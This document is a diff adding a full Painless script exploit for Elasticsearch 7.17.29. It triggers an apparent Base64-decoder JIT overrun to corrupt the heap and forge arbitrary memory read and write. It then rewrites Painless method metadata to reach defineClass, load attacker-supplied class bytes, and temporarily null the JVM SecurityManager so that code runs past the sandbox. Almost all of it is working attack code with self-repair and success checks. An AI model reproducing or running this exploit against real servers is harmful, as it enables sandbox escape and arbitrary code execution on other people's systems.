@@ -1,0 +1,514 @@
+/* The offsets and array sizes below are specific to the pinned compressed-oop
+ * HotSpot layouts used by Elasticsearch 7.17.29. The top-level code links
+ * otherwise unavailable methods through Painless metadata; these helpers keep
+ * each temporary heap-access operation short and repair its local arrays. */
+// Preserve these negative-index expressions; they are part of the heap-access sequence exercised by the pinned application comparisons.
+int rawRead(char[] a, int index) {
+    return (int) a[index < 0 ? index + 1 : index];
+}
+void rawWrite(char[] a, int index, int value) {
+    a[index < 0 ? index + 1 : index] = (char) value;
+}
+int readInt(char[] a, int at) {
+    return (int) a[at >> 1] | ((int) a[(at >> 1) + 1] << 16);
+}
+void writeInt(char[] a, int at, int value) {
+    a[at >> 1] = (char) value;
+    a[(at >> 1) + 1] = (char) (value >>> 16);
+}
+// References are 32-bit compressed-oop words. Infer the shift from live object
+// spacing; offsets are byte offsets, and a char[] payload begins at byte 16.
+int heapInt(char[] a, int self, int shift, int object, int offset) {
+    long delta = (((object & 4294967295L) - (self & 4294967295L)) << shift) + offset - 16L;
+    int index = (int) (delta >> 1);
+    return rawRead(a, index) | (rawRead(a, index + 1) << 16);
+}
+void heapWriteInt(char[] a, int self, int shift, int object, int offset, int value) {
+    long delta = (((object & 4294967295L) - (self & 4294967295L)) << shift) + offset - 16L;
+    int index = (int) (delta >> 1);
+    rawWrite(a, index, value);
+    rawWrite(a, index + 1, value >>> 16);
+}
+// Use one allowlisted decoder call site for both warmup and the malformed tail.
+int invokeDecoder(def decoder, byte[] input, byte[] output) {
+    return decoder.decode(input, output);
+}
+// The 129-byte input is 128 'A' bytes followed by '='. Warmup uses a large
+// destination, so even the affected intrinsic's overrun stays inside that array.
+// The later 98-byte destination exposes the same write to an adjacent object.
+Map decoderContext() {
+    byte[] input = new byte[129], whole = new byte[256], padded = new byte[260], warmOutput = new byte[512];
+    for (int i = 0; i < input.length; ++i) input[i] = (byte) 65;
+    for (int i = 0; i < whole.length; ++i) whole[i] = (byte) 65;
+    for (int i = 0; i < padded.length; ++i) padded[i] = (byte) 65;
+    input[128] = (byte) 61;
+    padded[258] = (byte) 61;
+    padded[259] = (byte) 61;
+    def decoder = Base64.getDecoder();
+    int checksum = 0;
+    for (int i = 0; i < 30000; ++i) checksum ^= invokeDecoder(decoder, (i & 1) == 0 ? whole : padded,
+        warmOutput);
+    for (int i = 0; i < 30000; ++i) try {
+        checksum ^= invokeDecoder(decoder, input, warmOutput);
+    } catch (IllegalArgumentException expected) {
+        checksum ^= i;
+    }
+    return ['decoder': decoder, 'input': input, 'whole': whole, 'padded': padded, 'warmOutput': warmOutput,
+        'diagnosticState': new int[30], 'checksum': checksum];
+}
+void warmDecoder(Map environment) {
+    def decoder = environment['decoder'];
+    byte[] whole = (byte[]) environment['whole'], padded = (byte[]) environment['padded'], input = (byte[]) environment['input'],
+        dst = (byte[]) environment['warmOutput'];
+    int checksum = 0;
+    for (int i = 0; i < 30000; ++i) try {
+        checksum ^= invokeDecoder(decoder, (i & 3) == 3 ? input : ((i & 1) == 0 ? whole : padded), dst);
+    } catch (IllegalArgumentException expected) {
+        checksum ^= i;
+    }
+    environment['checksum'] = checksum;
+}
+// Record primitive observations in a preallocated array before constructing a
+// diagnostic Map. The sentinel alone is insufficient: the guard, anchor and
+// compressed-reference spacing must also match the expected live allocation.
+void captureLayout(int[] d, int operation, char[] witness, char[] guard, Object[] anchor, int expectedAnchor,
+    int[] path, int fieldCount) {
+    d[4] = witness.length;
+    d[5] = guard.length;
+    d[6] = anchor.length;
+    for (int i = 7; i <= 13; ++i) d[i] = - 2147483648;
+    d[14] = expectedAnchor;
+    d[15] = - 1;
+    d[16] = path.length;
+    d[17] = fieldCount;
+    d[24] = 0;
+    d[28] = operation;
+    for (int i = 0; i < 6; ++i) d[18 + i] = i < path.length ? path[i] : - 2147483648;
+    if (d[4] == - 1700370022) {
+        d[7] = readInt(witness, 48);
+        d[8] = readInt(witness, 52);
+        d[9] = readInt(witness, 80);
+        d[10] = readInt(witness, 84);
+        d[11] = readInt(witness, 88);
+        d[12] = readInt(witness, 92);
+        d[13] = readInt(witness, 96);
+        d[24] = 7;
+        for (int s = 0; s <= 3; s += 3) if ((((d[13] & 4294967295L) - (d[12] & 4294967295L)) << s) == 56L &&
+            (((d[11] & 4294967295L) - (d[13] & 4294967295L)) << s) == 32L) d[15] = s;
+    }
+}
+Map layoutDiagnostic(int[] d) {
+    return ['transaction': d[0], 'operation': d[28] == 1 ? 'read-path': 'edit-refs', 'decoder_exception_kind': d[29],
+        'prior_unchanged_count': d[1], 'last_unchanged_transaction': d[2], 'last_success_transaction': d[3],
+        'witness_length': d[4], 'guard_length': d[5], 'anchor_length': d[6], 'guard_klass_at_48': d[7], 'guard_length_at_52': d[8],
+        'anchor_klass_at_80': d[9], 'anchor_length_at_84': d[10], 'anchor_self_at_88': d[11], 'witness_ref_at_92': d[12],
+        'guard_ref_at_96': d[13], 'expected_anchor_length': d[14], 'inferred_oop_shift': d[15], 'path_length': d[16],
+        'field_count': d[17], 'path_0': d[18], 'path_1': d[19], 'path_2': d[20], 'path_3': d[21], 'path_4': d[22],
+        'path_5': d[23], 'raw_read_mask': d[24], 'last_unchanged_witness_length': d[25], 'last_unchanged_guard_length': d[26],
+        'last_unchanged_anchor_length': d[27]];
+}
+// One heap-read transaction: create the adjacency, require the corruption
+// witness, follow reference fields, copy selected reference words into a real
+// Object[], then repair the witness and discard the temporary array reference.
+Map readPathOnce(Map environment, Object root, int[] path, int[] fields) {
+    int[] diagnostic = (int[]) environment['diagnosticState'];
+    int transaction = ++diagnostic[0];
+    warmDecoder(environment);
+    def decoder = environment['decoder'];
+    byte[] input = (byte[]) environment['input'];
+    char[] saved = new char[8];
+    Object[] result = new Object[fields.length];
+    Object start = root == null ? new Exception('owned-painless-lookup') : root;
+    int checksum = 0;
+    String decoderError = '';
+    // Allocation order and sizes define the expected destination/witness/guard/anchor layout.
+    byte[] destination = new byte[98];
+    char[] witness = new char[20];
+    char[] guard = new char[8];
+    Object[] anchor = new Object[6];
+    anchor[0] = anchor;
+    anchor[1] = witness;
+    anchor[2] = guard;
+    anchor[3] = null;
+    anchor[4] = start;
+    anchor[5] = result;
+    try {
+        checksum ^= invokeDecoder(decoder, input, destination);
+    } catch (Exception expected) {
+        decoderError = expected.getMessage();
+    }
+    captureLayout(diagnostic, 1, witness, guard, anchor, 6, path, fields.length);
+    diagnostic[29] = decoderError != null && decoderError.contains('wrong 4-byte ending unit') ? 1 : - 1;
+    // Disabled and fixed runtimes stop here, before any forged reference or heap edit.
+    if (diagnostic[4] == 20) {
+        diagnostic[1]++;
+        diagnostic[2] = transaction;
+        diagnostic[25] = diagnostic[4];
+        diagnostic[26] = diagnostic[5];
+        diagnostic[27] = diagnostic[6];
+        return ['stage': 'unchanged', 'restored': false, 'no_write_proven': false, 'diagnostic': layoutDiagnostic(diagnostic)];
+    }
+    if (diagnostic[4] != - 1700370022 || diagnostic[5] != 8 || diagnostic[6] != 6 || diagnostic[8] != 8 ||
+        diagnostic[10] != 6) return ['stage': 'layout-mismatch', 'restored': false, 'diagnostic': layoutDiagnostic(diagnostic)];
+    int aref = readInt(witness, 88), wref = readInt(witness, 92), gref = readInt(witness, 96), shift = - 1;
+    for (int s = 0; s <= 3; s += 3) if ((((gref & 4294967295L) - (wref & 4294967295L)) << s) == 56L &&
+        (((aref & 4294967295L) - (gref & 4294967295L)) << s) == 32L) shift = s;
+    diagnostic[15] = shift;
+    if (shift < 0) return ['stage': 'oop-mismatch', 'restored': false, 'diagnostic': layoutDiagnostic(diagnostic)];
+    // Copy the intact guard header into its own body to form a temporary char[].
+    // Save a header with the witness's original length for the repair below.
+    for (int i = 0; i < 8; ++i) saved[i] = witness[20 + i];
+    for (int i = 0; i < 8; ++i) witness[28 + i] = saved[i];
+    saved[6] = (char) 20;
+    saved[7] = (char) 0;
+    writeInt(witness, 68, - 1);
+    int fake = gref + (16 >>> shift);
+    writeInt(witness, 100, fake);
+    char[] memory = (char[]) anchor[3];
+    int object = readInt(witness, 104), out = readInt(witness, 108);
+    // Each path element is a byte offset of a reference field in the pinned layout.
+    for (int i = 0; i < path.length && object != 0; ++i) object = heapInt(memory, fake, shift, object,
+        path[i]);
+    if (object != 0) for (int i = 0; i < fields.length; ++i) heapWriteInt(memory, fake, shift, out, 16 + 4 * i,
+        heapInt(memory, fake, shift, object, fields[i]));
+    // Repair the overwritten witness header before exposing the result or allocating a Map.
+    for (int i = 0; i < 8; ++i) rawWrite(memory, - 44 + i, (int) saved[i]);
+    anchor[3] = null;
+    memory = null;
+    boolean restored = witness.length == 20 && guard.length == 8;
+    if (restored) diagnostic[3] = transaction;
+    return ['stage': object != 0 && restored ? 'read-path': 'path-mismatch', 'restored': restored, 'references': result,
+        'checksum': checksum];
+}
+// The write form uses the same corruption/repair transaction. It returns the
+// previous reference and int values so every higher-level metadata edit can
+// write back exactly what it replaced.
+Map editRefsOnce(Map environment, Object[] roots, int[] rootIndices, int[] offsets, Object[] values, int[] wordRootIndices,
+    int[] wordOffsets, int[] wordValues) {
+    int[] diagnostic = (int[]) environment['diagnosticState'];
+    int transaction = ++diagnostic[0];
+    warmDecoder(environment);
+    def decoder = environment['decoder'];
+    byte[] input = (byte[]) environment['input'];
+    char[] saved = new char[8];
+    Object[] previous = new Object[offsets.length];
+    int[] previousWords = new int[wordOffsets.length];
+    int checksum = 0;
+    String decoderError = '';
+    byte[] destination = new byte[98];
+    char[] witness = new char[20], guard = new char[8];
+    Object[] anchor = new Object[7];
+    anchor[0] = anchor;
+    anchor[1] = witness;
+    anchor[2] = guard;
+    anchor[3] = null;
+    anchor[4] = roots;
+    anchor[5] = values;
+    anchor[6] = previous;
+    try {
+        checksum ^= invokeDecoder(decoder, input, destination);
+    } catch (Exception expected) {
+        decoderError = expected.getMessage();
+    }
+    captureLayout(diagnostic, 2, witness, guard, anchor, 7, offsets, wordOffsets.length);
+    diagnostic[29] = decoderError != null && decoderError.contains('wrong 4-byte ending unit') ? 1 : - 1;
+    // Disabled and fixed runtimes stop here, before any forged reference or heap edit.
+    if (diagnostic[4] == 20) {
+        diagnostic[1]++;
+        diagnostic[2] = transaction;
+        diagnostic[25] = diagnostic[4];
+        diagnostic[26] = diagnostic[5];
+        diagnostic[27] = diagnostic[6];
+        return ['stage': 'unchanged', 'restored': false, 'no_write_proven': false, 'diagnostic': layoutDiagnostic(diagnostic)];
+    }
+    if (diagnostic[4] != - 1700370022 || diagnostic[5] != 8 || diagnostic[6] != 7 || diagnostic[8] != 8 ||
+        diagnostic[10] != 7) return ['stage': 'layout-mismatch', 'restored': false, 'diagnostic': layoutDiagnostic(diagnostic)];
+    int aref = readInt(witness, 88), wref = readInt(witness, 92), gref = readInt(witness, 96), shift = - 1;
+    for (int s = 0; s <= 3; s += 3) if ((((gref & 4294967295L) - (wref & 4294967295L)) << s) == 56L &&
+        (((aref & 4294967295L) - (gref & 4294967295L)) << s) == 32L) shift = s;
+    diagnostic[15] = shift;
+    if (shift < 0) return ['stage': 'oop-mismatch', 'restored': false, 'diagnostic': layoutDiagnostic(diagnostic)];
+    // Copy the intact guard header into its own body to form a temporary char[].
+    // Save a header with the witness's original length for the repair below.
+    for (int i = 0; i < 8; ++i) saved[i] = witness[20 + i];
+    for (int i = 0; i < 8; ++i) witness[28 + i] = saved[i];
+    saved[6] = (char) 20;
+    saved[7] = (char) 0;
+    writeInt(witness, 68, - 1);
+    int fake = gref + (16 >>> shift);
+    writeInt(witness, 100, fake);
+    char[] memory = (char[]) anchor[3];
+    int rootArray = readInt(witness, 104), valueArray = readInt(witness, 108), out = readInt(witness,
+        112);
+    for (int i = 0; i < offsets.length; ++i) {
+        int object = heapInt(memory, fake, shift, rootArray, 16 + 4 * rootIndices[i]);
+        int old = heapInt(memory, fake, shift, object, offsets[i]);
+        int value = heapInt(memory, fake, shift, valueArray, 16 + 4 * i);
+        heapWriteInt(memory, fake, shift, out, 16 + 4 * i, old);
+        heapWriteInt(memory, fake, shift, object, offsets[i], value);
+    }
+    for (int i = 0; i < wordOffsets.length; ++i) {
+        int object = heapInt(memory, fake, shift, rootArray, 16 + 4 * wordRootIndices[i]);
+        previousWords[i] = heapInt(memory, fake, shift, object, wordOffsets[i]);
+        heapWriteInt(memory, fake, shift, object, wordOffsets[i], wordValues[i]);
+    }
+    // Repair the overwritten witness header before exposing the result or allocating a Map.
+    for (int i = 0; i < 8; ++i) rawWrite(memory, - 44 + i, (int) saved[i]);
+    anchor[3] = null;
+    memory = null;
+    boolean restored = witness.length == 20 && guard.length == 8;
+    if (restored) diagnostic[3] = transaction;
+    return ['stage': restored ? 'edited-refs': 'repair-mismatch', 'restored': restored, 'previous': previous,
+        'previousWords': previousWords, 'checksum': checksum];
+}
+// These wrappers deliberately perform one transaction; an unexpected layout is
+// an error, rather than an invitation to keep corrupting the same JVM.
+Map readPath(Map environment, Object root, int[] path, int[] fields) {
+    return readPathOnce(environment, root, path, fields);
+}
+Map editRefs(Map environment, Object[] roots, int[] rootIndices, int[] offsets, Object[] values, int[] wordRootIndices,
+    int[] wordOffsets, int[] wordValues) {
+    return editRefsOnce(environment, roots, rootIndices, offsets, values, wordRootIndices, wordOffsets,
+        wordValues);
+}
+Object[] references(Map result) {
+    if (result['stage'] != 'read-path') throw new IllegalStateException('heap-read stage=' + result['stage'] + ' restored=' + result['restored'] + ' diagnostic=' + result['diagnostic']);
+    return (Object[]) result['references'];
+}
+Supplier captureSupplier(Supplier value) {
+    return value;
+}
+Function captureFunction(Function value) {
+    return value;
+}
+// Recover Painless's class-name, canonical-name and per-type metadata maps by
+// following the pinned path from a newly created exception. The first read is
+// also the control gate for the entire chain.
+// Paths follow successive object fields; the final field list selects words
+// from the object reached. Every number is a byte offset in the pinned JVM
+// layout. Preserve transaction order: result verification expects 24 repairs.
+Map environment = decoderContext();
+Map captured = readPath(environment, null, new int[] {16, 24, 16, 52, 88, 16}, new int[] {12, 16, 20});
+if (captured['stage'] != 'read-path') return captured;
+Object[] capturedRefs = (Object[]) captured['references'];
+Map names = (Map) capturedRefs[0];
+Map canonical = (Map) capturedRefs[1];
+Map types = (Map) capturedRefs[2];
+// Object.getClass's cached reflection entry supplies java.lang.Class without
+// asking the Painless allowlist to resolve that excluded method directly.
+Object objectClass = names.get('java.lang.Object');
+Object stringClass = names.get('java.lang.String');
+Object[] publicMethods = (Object[]) references(readPath(environment, objectClass, new int[] {68, 12},
+    new int[] {44}))[0];
+Object excludedMethod = null, classClass = null;
+for (int i = 0; i < publicMethods.length; ++i) {
+    if (publicMethods[i].toString().contains('java.lang.Object.getClass()')) {
+        excludedMethod = publicMethods[i];
+        break;
+    }
+}
+if (excludedMethod == null) return ['last_transaction': layoutDiagnostic((int[]) environment['diagnosticState']),
+    'stage': 'reflection-cache-missing', 'restored_heap': true];
+classClass = references(readPath(environment, excludedMethod, new int[0], new int[] {44}))[0];
+Object stringEntry = types.get(stringClass);
+Object[] methodMaps = references(readPath(environment, stringEntry, new int[0], new int[] {20, 40}));
+Map methods = (Map) references(readPath(environment, methodMaps[0], new int[0], new int[] {12}))[0];
+Object metadata = methods.get('toUpperCase/0');
+Object[] metadataFields = references(readPath(environment, metadata, new int[0], new int[] {12, 20, 32}));
+Object javaMethod = metadataFields[0], methodType = metadataFields[2];
+// Temporarily make the allowlisted String.toUpperCase call shape resolve to
+// Class.forName. Link the three method references, restore the shared metadata,
+// then use the already-linked callables to discover the required Class objects.
+Object oldAlias = methods.put('forName/0', metadata);
+Object[] roots = new Object[] {metadata, methodType, javaMethod};
+int[] rootIndices = new int[] {0, 1, 1, 2, 2};
+int[] offsets = new int[] {20, 12, 32, 36, 40};
+Map changed = editRefs(environment, roots, rootIndices, offsets, new Object[] {classClass, classClass,
+    null, classClass, 'forName'}, new int[] {2}, new int[] {32}, new int[] {9});
+if (changed['stage'] != 'edited-refs') return ['last_transaction': layoutDiagnostic((int[]) environment['diagnosticState']),
+    'stage': 'metadata-edit-failed', 'detail': changed['stage']];
+Object[] previous = (Object[]) changed['previous'];
+Object observed = null;
+Supplier[] callables = new Supplier[3];
+String[] classNames = new String[] {'java.lang.invoke.MethodHandles', 'java.lang.invoke.MethodHandles$Lookup',
+    '[B'};
+String error = '';
+try {
+    for (int i = 0; i < classNames.length; ++i) {
+        def receiver = classNames[i];
+        callables[i] = captureSupplier(receiver::toUpperCase);
+    }
+} catch (Exception e) {
+    error = e.toString();
+}
+Map restored = editRefs(environment, roots, rootIndices, offsets, previous, new int[] {2}, new int[] {32},
+    (int[]) changed['previousWords']);
+if (oldAlias == null) methods.remove('forName/0');
+else methods.put('forName/0', oldAlias);
+Object methodHandlesClass = callables[0] == null ? null : callables[0].get();
+Object lookupClass = callables[1] == null ? null : callables[1].get();
+Object byteArrayClass = callables[2] == null ? null : callables[2].get();
+if (methodHandlesClass == null || lookupClass == null || byteArrayClass == null || restored['stage'] != 'edited-refs') return ['last_transaction': layoutDiagnostic((int[]) environment['diagnosticState']),
+    'stage': 'class-discovery-failed', 'error': error, 'restored_lookup': restored['stage'] == 'edited-refs'];
+// Retarget a second allowlisted call shape to MethodHandles.lookup(), obtain
+// the lookup associated with this compiled script, and restore that metadata.
+Object base64Class = names.get('java.util.Base64');
+Object base64Entry = types.get(base64Class);
+Map staticMethods = (Map) references(readPath(environment, base64Entry, new int[] {16}, new int[] {12}))[0];
+Object runtimeMetadata = staticMethods.get('getUrlDecoder/0');
+Object[] runtimeFields = references(readPath(environment, runtimeMetadata, new int[0], new int[] {12,
+    20, 32}));
+Object runtimeJavaMethod = runtimeFields[0], runtimeMethodType = runtimeFields[2];
+Object[] runtimeRoots = new Object[] {runtimeMetadata, runtimeMethodType, runtimeJavaMethod};
+int[] runtimeRootIndices = new int[] {0, 1, 1, 2, 2};
+int[] runtimeOffsets = new int[] {20, 12, 32, 36, 40};
+Map runtimeChange = editRefs(environment, runtimeRoots, runtimeRootIndices, runtimeOffsets, new Object[] {lookupClass,
+    lookupClass, null, methodHandlesClass, 'lookup'}, new int[0], new int[0], new int[0]);
+if (runtimeChange['stage'] != 'edited-refs') return ['last_transaction': layoutDiagnostic((int[]) environment['diagnosticState']),
+    'stage': 'runtime-metadata-failed', 'detail': runtimeChange['stage']];
+Object runtimeObject = null;
+try {
+    def empty = Optional.empty();
+    runtimeObject = empty.orElseGet(Base64::getUrlDecoder);
+} catch (Exception e) {
+    error = e.toString();
+}
+Map runtimeRestore = editRefs(environment, runtimeRoots, runtimeRootIndices, runtimeOffsets, (Object[]) runtimeChange['previous'],
+    new int[0], new int[0], new int[0]);
+if (runtimeObject == null || runtimeRestore['stage'] != 'edited-refs') return ['last_transaction': layoutDiagnostic((int[]) environment['diagnosticState']),
+    'stage': 'runtime-discovery-failed', 'error': error];
+Map mutableTypes = (Map) references(readPath(environment, types, new int[0], new int[] {12}))[0];
+Map mutableCanonical = (Map) references(readPath(environment, canonical, new int[0], new int[] {12}))[0];
+Map runtimeMethods = (Map) references(readPath(environment, methodMaps[1], new int[0], new int[] {12}))[0];
+// Link Lookup.defineClass(byte[]) through String.concat's one-argument shape.
+// The temporary type-map aliases let Painless construct the reference; all
+// replaced map entries, parameter types and method fields are saved for repair.
+Object execMetadata = methods.get('concat/1');
+Object[] execFields = references(readPath(environment, execMetadata, new int[0], new int[] {12, 16, 20,
+    24, 32}));
+Object execJavaMethod = execFields[0], execMethodType = execFields[4];
+List execParameters = (List) execFields[3];
+Object[] execParameterTypes = (Object[]) references(readPath(environment, execMethodType, new int[0],
+    new int[] {16}))[0];
+Object savedReceiver = execParameterTypes[0], savedArgument = execParameterTypes[1], savedListArgument = execParameters.set(0,
+    byteArrayClass);
+execParameterTypes[0] = lookupClass;
+execParameterTypes[1] = byteArrayClass;
+Object oldRuntimeType = mutableTypes.put(lookupClass, stringEntry);
+Object oldRuntimeName = mutableCanonical.put('java.lang.invoke.MethodHandles.Lookup', lookupClass);
+Object oldExecAlias = methods.put('defineClass/1', execMetadata);
+Object oldRuntimeAlias = runtimeMethods.put('concat/1', execMetadata);
+Object[] execRoots = new Object[] {execMetadata, execMethodType, execJavaMethod};
+int[] execRootIndices = new int[] {0, 0, 1, 1, 2, 2};
+int[] execOffsets = new int[] {16, 20, 12, 32, 36, 40};
+Map execChange = editRefs(environment, execRoots, execRootIndices, execOffsets, new Object[] {lookupClass,
+    classClass, classClass, null, lookupClass, 'defineClass'}, new int[0], new int[0], new int[0]);
+Function execFunction = null;
+if (execChange['stage'] == 'edited-refs') try {
+    def receiver = runtimeObject;
+    execFunction = captureFunction(receiver::concat);
+} catch (Exception e) {
+    error = e.toString();
+}
+Map execRestore = execChange['stage'] == 'edited-refs' ? editRefs(environment, execRoots, execRootIndices,
+    execOffsets, (Object[]) execChange['previous'], new int[0], new int[0], new int[0]) : ['stage': 'edit-not-applied',
+    'restored': true];
+execParameterTypes[0] = savedReceiver;
+execParameterTypes[1] = savedArgument;
+execParameters.set(0, savedListArgument);
+if (oldRuntimeType == null) mutableTypes.remove(lookupClass);
+else mutableTypes.put(lookupClass, oldRuntimeType);
+if (oldRuntimeName == null) mutableCanonical.remove('java.lang.invoke.MethodHandles.Lookup');
+else mutableCanonical.put('java.lang.invoke.MethodHandles.Lookup', oldRuntimeName);
+if (oldExecAlias == null) methods.remove('defineClass/1');
+else methods.put('defineClass/1', oldExecAlias);
+if (oldRuntimeAlias == null) runtimeMethods.remove('concat/1');
+else runtimeMethods.put('concat/1', oldRuntimeAlias);
+if (execFunction == null || execRestore['stage'] != 'edited-refs') return ['last_transaction': layoutDiagnostic((int[]) environment['diagnosticState']),
+    'stage': 'define-link-failed', 'error': error];
+// The request carries ordinary Base64-encoded class bytes. The same chain can
+// define the original file marker or the generated native-command class.
+Object markerClass = null;
+try {
+    markerClass = execFunction.apply(Base64.getDecoder().decode((String) params.marker_class));
+} catch (Exception e) {
+    error = e.toString();
+}
+if (markerClass == null) return ['last_transaction': layoutDiagnostic((int[]) environment['diagnosticState']),
+    'stage': 'define-class-failed', 'error': error, 'lookup': runtimeObject.toString(), 'restored_lookup': true,
+    'restored_heap': true];
+// Bind two calls to the supplied class's static run(path, text) method: one
+// denied-path probe and one real invocation. Restore the lookup metadata before
+// either callable is used.
+Object oldMarkerAlias = methods.put('run/1', execMetadata);
+Map markerChange = editRefs(environment, new Object[] {execJavaMethod}, new int[] {0, 0}, new int[] {36,
+    40}, new Object[] {markerClass, 'run'}, new int[] {0}, new int[] {32}, new int[] {9});
+Function[] markerFunctions = new Function[2];
+String[] markerPaths = new String[] { (String) params.marker_path + '.denied', (String) params.marker_path};
+if (markerChange['stage'] == 'edited-refs') try {
+    for (int i = 0; i < markerPaths.length; ++i) {
+        def receiver = markerPaths[i];
+        markerFunctions[i] = captureFunction(receiver::concat);
+    }
+} catch (Exception e) {
+    error = e.toString();
+}
+Map markerRestore = markerChange['stage'] == 'edited-refs' ? editRefs(environment, new Object[] {execJavaMethod},
+    new int[] {0, 0}, new int[] {36, 40}, (Object[]) markerChange['previous'], new int[] {0}, new int[] {32},
+    (int[]) markerChange['previousWords']) : ['stage': 'edit-not-applied', 'restored': true];
+if (oldMarkerAlias == null) methods.remove('run/1');
+else methods.put('run/1', oldMarkerAlias);
+if (markerFunctions[0] == null || markerFunctions[1] == null || markerRestore['stage'] != 'edited-refs') return ['last_transaction': layoutDiagnostic((int[]) environment['diagnosticState']),
+    'stage': 'marker-link-failed', 'error': error, 'restored_lookup': markerRestore['stage'] == 'edited-refs',
+    'restored_heap': markerRestore['restored']];
+// Establish the real file-permission denial with the original SecurityManager.
+// Save the original SecurityManager and clear the global System.security for
+// the supplied-class invocation. Its mirror offset is 124 on the pinned Java 17
+// build and 128 on Java 21.
+Object deniedResult = null;
+String deniedError = '';
+try {
+    deniedResult = markerFunctions[0].apply((String) params.marker_text);
+} catch (Exception denied) {
+    deniedError = denied.toString();
+}
+boolean fileDenied = deniedResult == null && (deniedError.contains('AccessControlException') || deniedError.contains('access denied'));
+Object systemClass = names.get('java.lang.System');
+Object[] securityRoots = new Object[] {systemClass};
+Map securityChange = editRefs(environment, securityRoots, new int[] {0}, new int[] {128}, new Object[] {null},
+    new int[0], new int[0], new int[0]);
+if (securityChange['stage'] != 'edited-refs') return ['last_transaction': layoutDiagnostic((int[]) environment['diagnosticState']),
+    'stage': 'security-clear-failed', 'restored_heap': securityChange['restored'], 'file_denied': fileDenied,
+    'denied_error': deniedError];
+Object[] oldSecurity = (Object[]) securityChange['previous'];
+boolean managerPresent = oldSecurity[0] != null;
+Object markerResult = null;
+try {
+    markerResult = markerFunctions[1].apply((String) params.marker_text);
+} catch (Exception failed) {
+    error = failed.toString();
+}
+// Restore the exact saved manager, read it back, and retry the same denied
+// operation. These are scoped checks; classes and compiled call sites can persist.
+Map securityRestore = editRefs(environment, securityRoots, new int[] {0}, new int[] {128}, oldSecurity,
+    new int[0], new int[0], new int[0]);
+boolean restoredSecurity = securityRestore['stage'] == 'edited-refs';
+Map securityRead = readPath(environment, systemClass, new int[0], new int[] {128});
+boolean securityReadback = securityRead['stage'] == 'read-path' && ((Object[]) securityRead['references'])[0] == oldSecurity[0];
+Object afterRestoreResult = null;
+String afterRestoreError = '';
+if (restoredSecurity && securityReadback) try {
+    afterRestoreResult = markerFunctions[0].apply((String) params.marker_text);
+} catch (Exception deniedAgain) {
+    afterRestoreError = deniedAgain.toString();
+}
+boolean afterRestoreDenied = afterRestoreResult == null && (afterRestoreError.contains('AccessControlException') ||
+    afterRestoreError.contains('access denied'));
+// A successful response requires the expected per-request return token and all
+// permission checks. The runner independently verifies command/file results.
+return ['last_transaction': layoutDiagnostic((int[]) environment['diagnosticState']), 'stage': 'bytecode-marker',
+    'success':markerResult==(String)params.marker_return&&fileDenied && managerPresent && restoredSecurity && securityReadback && afterRestoreDenied,
+    'bytecode_result':markerResult, 'marker_class': markerClass.toString(), 'lookup': runtimeObject.toString(), 'file_denied': fileDenied,
+    'denied_error': deniedError, 'manager_present_before': managerPresent, 'security_restored': restoredSecurity,
+    'security_readback': securityReadback, 'post_restore_denied': afterRestoreDenied, 'post_restore_error': afterRestoreError,
+    'restored_lookup': true, 'restored_heap': securityRestore['restored'], 'error': error];
